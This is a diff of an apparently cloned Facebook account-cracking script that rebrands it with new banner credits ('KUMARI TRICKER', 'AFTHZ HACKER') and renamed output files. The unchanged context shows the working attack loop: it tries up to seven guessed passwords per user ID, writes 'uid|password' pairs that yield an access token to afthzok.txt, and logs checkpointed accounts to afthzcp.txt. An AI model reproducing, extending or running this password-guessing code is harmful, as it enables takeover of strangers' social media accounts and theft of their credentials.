@@ -21,14 +21,14 @@ logo = """
       
 \033[1;92m _______  ______   ______           
 \033[1;92m(  / (_______)
-AͣFᴛⷮнⷩZ
+AͣFᴛⷮнⷩZ 
 
-                           
+   KUMARI TRICKER                         
 
            нⷩAͣCͨᴋⷦEͤRͬ
-\033[1;92m _        _        _______          
+\033[1;92m _        _  Coded by      _______          
 \033[1;92m(      \|
-                                     
+             KUMARI TRICKER OWNER OF AFTHZ GROUP                        
 \033[1;92m──────────────────────────────────•••••••••••
      \033[1;92m>> Author= AFTHZ HACKER
      \033[1;92m>> FACEBOOK= AFHTZ
@@ -218,7 +218,7 @@ def crack_select():
 			print('')
 			print("\tAuto pass cracking")
 			print('')
-			print("  Abe Gandu : "+q["name"])
+			print("  Abe bhwary : "+q["name"])
 		except KeyError:
 			print("\tInvalid link OR token")
 			print("")
@@ -285,14 +285,14 @@ def crack_select():
 			q = json.loads(data)
 			if "access_token" in q:
 				print(" \033[1;32m [afthz-ok] "+uid+" | "+pass1+"\033[0;97m")
-				ok = open("Talibanok.txt", "a")
+				ok = open("afthzok.txt", "a")
 				ok.write(uid+"|"+pass1+"\n")
 				ok.close()
 				oks.append(uid+pass1)
 			else:
 				if "www.facebook.com" in q["error_msg"]:
 					print(" \033[1;32m [afthz_CP] "+uid+" | "+pass1+"\033[0;97m")
-					cp = open("Talibancp.txt", "a")
+					cp = open("afthzcp.txt", "a")
 					cp.write(uid+"|"+pass1+"\n")
 					cp.close()
 					cps.append(uid+pass1)
@@ -302,14 +302,14 @@ def crack_select():
 					q = json.loads(data)
 					if "access_token" in q:
 						print(" \033[1;33m [afthz-OK] "+uid+" | "+pass2+"\033[0;97m")
-						ok = open("Talibanok.txt", "a")
+						ok = open("afthzok.txt", "a")
 						ok.write(uid+"|"+pass2+"\n")
 						ok.close()
 						oks.append(uid+pass2)
 					else:
 						if "www.facebook.com" in q["error_msg"]:
 							print(" \033[1;32m [afthz_CP] "+uid+" | "+pass2+"\033[0;97m")
-							cp = open("Talibancp.txt", "a")
+							cp = open("afthzcp.txt", "a")
 							cp.write(uid+"|"+pass2+"\n")
 							cp.close()
 							cps.append(uid+pass2)
@@ -319,14 +319,14 @@ def crack_select():
 							q = json.loads(data)
 							if "access_token" in q:
 								print(" \033[1;33m [afthz-OK] "+uid+" | "+pass3+"\033[0;97m")
-								ok = open("Talibanok.txt", "a")
+								ok = open("afthzok.txt", "a")
 								ok.write(uid+"|"+pass3+"\n")
 								ok.close()
 								oks.append(uid+pass3)
 							else:
 								if "www.facebook.com" in q["error_msg"]:
 									print(" \033[1;32m [afthz_CP] "+uid+" | "+pass3+"\033[0;97m")
-									cp = open("Talibancp.txt", "a")
+									cp = open("afthzcp.txt", "a")
 									cp.write(uid+"|"+pass3+"\n")
 									cp.close()
 									cps.append(uid+pass3)
@@ -336,14 +336,14 @@ def crack_select():
 									q = json.loads(data)
 									if "access_token" in q:
 										print(" \033[1;33m [afthz-OK] "+uid+" | "+pass4+"\033[0;97m")
-										ok = open("Talibanok.txt", "a")
+										ok = open("afthzok.txt", "a")
 										ok.write(uid+"|"+pass4+"\n")
 										ok.close()
 										oks.append(uid+pass4)
 									else:
 										if "www.facebook.com" in q["error_msg"]:
 											print(" \033[1;32m [afthz_CP] "+uid+" | "+pass4+"\033[0;97m")
-											cp = open("Talibancp.txt", "a")
+											cp = open("afthzcp.txt", "a")
 											cp.write(uid+"|"+pass4+"\n")
 											cp.close()
 											cps.append(uid+pass4)
@@ -353,14 +353,14 @@ def crack_select():
 											q = json.loads(data)
 											if "access_token" in q:
 												print(" \033[1;33m [afthz-OK] "+uid+" | "+pass5+"\033[0;97m")
-												ok = open("Talibanok.txt", "a")
+												ok = open("afthzok.txt", "a")
 												ok.write(uid+"|"+pass5+"\n")
 												ok.close()
 												oks.append(uid+pass5)
 											else:
 												if "www.facebook.com" in q["error_msg"]:
 													print(" \033[1;32m [afthz_CP] "+uid+" | "+pass5+"\033[0;97m")
-													cp = open("Talibancp.txt", "a")
+													cp = open("afthzcp.txt", "a")
 													cp.write(uid+"|"+pass5+"\n")
 													cp.close()
 													cps.append(uid+pass5)
@@ -370,14 +370,14 @@ def crack_select():
 													q = json.loads(data)
 													if "access_token" in q:
 														print(" \033[1;33m [afthz-OK] "+uid+" | "+pass6+"\033[0;97m")
-														ok = open("Talibanok.txt", "a")
+														ok = open("afthzok.txt", "a")
 														ok.write(uid+"|"+pass6+"\n")
 														ok.close()
 														oks.append(uid+pass6)
 													else:
 														if "www.facebook.com" in q["error_msg"]:
 															print(" \033[1;32m [afthz_CP] "+uid+" | "+pass6+"\033[0;97m")
-															cp = open("Talibancp.txt", "a")
+															cp = open("afthzcp.txt", "a")
 															cp.write(uid+"|"+pass6+"\n")
 															cp.close()
 															cps.append(uid+pass6)
@@ -387,14 +387,14 @@ def crack_select():
 															q = json.loads(data)
 															if "access_token" in q:
 																print(" \033[1;33m [afthz-OK] "+uid+" | "+pass7+"\033[0;97m")
-																ok = open("Talibanok.txt", "a")
+																ok = open("afthzok.txt", "a")
 																ok.write(uid+"|"+pass7+"\n")
 																ok.close()
 																oks.append(uid+pass7)
 															else:
 																if "www.facebook.com" in q["error_msg"]:
 																	print(" \033[1;32m [afthz_CP] "+uid+" | "+pass7+"\033[0;97m")
-																	cp = open("Talibancp.txt", "a")
+																	cp = open("afthzcp.txt", "a")
 																	cp.write(uid+"|"+pass7+"\n")
 																	cp.close()
 																	cps.append(uid+pass7)
@@ -525,14 +525,14 @@ def choice_select():
 			q = json.loads(data)
 			if "access_token" in q:
 				print(" \033[1;33m [afthz-OK] "+uid+" | "+pass1+"\033[0;97m")
-				ok = open("Talibanok.txt", "a")
+				ok = open("afthzok.txt", "a")
 				ok.write(uid+"|"+pass1+"\n")
 				ok.close()
 				oks.append(uid+pass1)
 			else:
 				if "www.facebook.com" in q["error_msg"]:
 					print(" \033[1;32m [afthz_CP] "+uid+" | "+pass1+"\033[0;97m")
-					cp = open("Talibancp.txt", "a")
+					cp = open("afthzcp.txt", "a")
 					cp.write(uid+"|"+pass1+"\n")
 					cp.close()
 					cps.append(uid+pass1)
@@ -541,14 +541,14 @@ def choice_select():
 					q = json.loads(data)
 					if "access_token" in q:
 						print(" \033[1;33m [afthz-OK] "+uid+" | "+pass2+"\033[0;97m")
-						ok = open("Talibanok.txt", "a")
+						ok = open("afthzok.txt", "a")
 						ok.write(uid+"|"+pass2+"\n")
 						ok.close()
 						oks.append(uid+pass2)
 					else:
 						if "www.facebook.com" in q["error_msg"]:
 							print(" \033[1;32m [afthz_CP] "+uid+" | "+pass2+"\033[0;97m")
-							cp = open("Talibancp.txt", "a")
+							cp = open("afthzcp.txt", "a")
 							cp.write(uid+"|"+pass2+"\n")
 							cp.close()
 							cps.append(uid+pass2)
@@ -557,14 +557,14 @@ def choice_select():
 							q = json.loads(data)
 							if "access_token" in q:
 								print(" \033[1;33m [afthz-OK] "+uid+" | "+pass3+"\033[0;97m")
-								ok = open("Talibanok.txt", "a")
+								ok = open("afthzok.txt", "a")
 								ok.write(uid+"|"+pass3+"\n")
 								ok.close()
 								oks.append(uid+pass3)
 							else:
 								if "www.facebook.com" in q["error_msg"]:
 									print(" \033[1;32m [afthz_CP] "+uid+" | "+pass3+"\033[0;97m")
-									cp = open("Talibancp.txt", "a")
+									cp = open("afthzcp.txt", "a")
 									cp.write(uid+"|"+pass3+"\n")
 									cp.close()
 									cps.append(uid+pass3)
@@ -573,14 +573,14 @@ def choice_select():
 									q = json.loads(data)
 									if "access_token" in q:
 										print(" \033[1;33m [afthz-OK] "+uid+" | "+pass4+"\033[0;97m")
-										ok = open("Talibanok.txt", "a")
+										ok = open("afthzok.txt", "a")
 										ok.write(uid+"|"+pass4+"\n")
 										ok.close()
 										oks.append(uid+pass4)
 									else:
 										if "www.facebook.com" in q["error_msg"]:
 											print(" \033[1;32m [afthz_CP] "+uid+" | "+pass4+"\033[0;97m")
-											cp = open("Talibancp.txt", "a")
+											cp = open("afthzcp.txt", "a")
 											cp.write(uid+"|"+pass4+"\n")
 											cp.close()
 											cps.append(uid+pass4)
@@ -589,14 +589,14 @@ def choice_select():
 											q = json.loads(data)
 											if "access_token" in q:
 												print(" \033[1;33m [afthz-OK] "+uid+" | "+pass5+"\033[0;97m")
-												ok = open("Talibanok.txt", "a")
+												ok = open("afthzok.txt", "a")
 												ok.write(uid+"|"+pass5+"\n")
 												ok.close()
 												oks.append(uid+pass5)
 											else:
 												if "www.facebook.com" in q["error_msg"]:
 													print(" \033[1;32m [afthz_CP] "+uid+" | "+pass5+"\033[0;97m")
-													cp = open("Talibancp.txt", "a")
+													cp = open("afthzcp.txt", "a")
 													cp.write(uid+"|"+pass5+"\n")
 													cp.close()
 													cps.append(uid+pass5)
@@ -605,7 +605,7 @@ def choice_select():
 													q = json.loads(data)
 													if "access_token" in q:
 														print(" \033[1;33m [afthz-OK] "+uid+" | "+pass6+"\033[0;97m")
-														ok = open("Talibanok.txt", "a")
+														ok = open("afthzok.txt", "a")
 														ok.write(uid+"|"+pass6+"\n")
 														ok.close()
 														oks.append(uid+pass6)
